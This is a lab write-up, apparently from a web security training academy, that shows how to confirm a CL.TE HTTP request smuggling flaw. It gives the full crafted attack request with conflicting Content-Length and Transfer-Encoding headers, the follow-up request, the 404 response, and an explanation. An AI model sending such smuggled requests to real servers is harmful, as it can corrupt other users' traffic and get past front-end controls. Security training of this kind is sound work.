## 1. Introduction

In this lab it will be confirmed if CL.TE vulnerability exists, meaning that the Frontend uses Content-Length and Backend processes requests using Transfer-Encoding.

## 2. Challenge

The challenge is to smuggle a request to the backend, so that the subsequent request for the web root "/" triggers a 404 Not Found response.

## 3. Solution

Attack Request:
```http
POST / HTTP/1.1
Host: 0a67003404744ddb85da30b5008e00b5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Append: X
```

Normal Request:
```http
GET / HTTP/1.1
Host: 0a67003404744ddb85da30b5008e00b5.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Response:
```http
HTTP/2 404 Not Found
Content-Type: application/json; charset=utf-8
Set-Cookie: session=VpYpqEjVKOPBTUVhWu3M5xqpbiDV9fRt; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 11

"Not Found"
```

## 4. Explanation

Since we want to confirm if this is a CL.TE vulnerability we suppose that Frontend processes Content-Length, so we leave the option to update it automatically.

In the body of the attack request we put our request that we want to smuggle in the backend, which in this case is intended to cause a 404. But, since we also suppose that the backend processes Transfer-Encoding, then we have to craft the body in such a way that the chunked message will be ended before our smuggled request.

This as the backend will be tricked to think that at that point "0", the request ended and the next part of the body to be counted as part of the next sequence:

```http
0

GET /404 HTTP/1.1
```

But, if we leave the body as this, when the normal request comes, it will be appended right after the "GET /404 HTTP/1.1", and we will have the following:

```http
GET /404 HTTP/1.1
GET / HTTP/1.1
...
```

And this will be invalid, since we will have two "GETs", and in this case we just need to put some header, so when the appending happens, there will not be two GET methods, that's where the "X-Append: X" comes. And the smuggled request will look like:

```http
GET /404 HTTP/1.1
X-Append: XGET / HTTP/1.1
...
```

This will cause a 404 Not Found.